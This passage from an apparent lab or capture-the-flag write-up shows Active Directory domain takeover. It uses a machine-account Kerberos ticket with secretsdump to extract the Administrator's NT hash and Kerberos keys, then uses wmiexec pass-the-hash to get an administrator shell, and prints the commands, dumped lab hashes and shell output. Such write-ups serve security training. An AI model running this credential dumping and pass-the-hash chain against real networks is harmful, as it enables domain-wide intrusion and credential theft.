[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
                                                                                         
```

# Shell as ADMIN

### secretsdump.py

The machine account cannot get a shell directly, but this TGT can be used to dump hashes from the DC:

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ KRB5CCNAME=dc-jpq225.ccache /usr/share/doc/python3-impacket/examples/secretsdump.py  -k -no-pass cicada.vl/dc-jpq225\$@dc-jpq225.cicada.vl -just-dc-user administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
[*] Cleaning up... 
```

### wmiexec.py

The hash is valid:

A quick way to get a shell from here is `wmiexec`:

```
┌──(parallels㉿kali-linux-2025-2)-[~]
└─$ /usr/share/doc/python3-impacket/examples/wmiexec.py cicada.vl/administrator@dc-jpq225.cicada.vl -k -hashes :85a0da53871a9d56b6cd05deda3a5e87
wmiexec.py: command not found

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] SMBv3.0 dialect used
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
cicada\administrator

C:\>
```
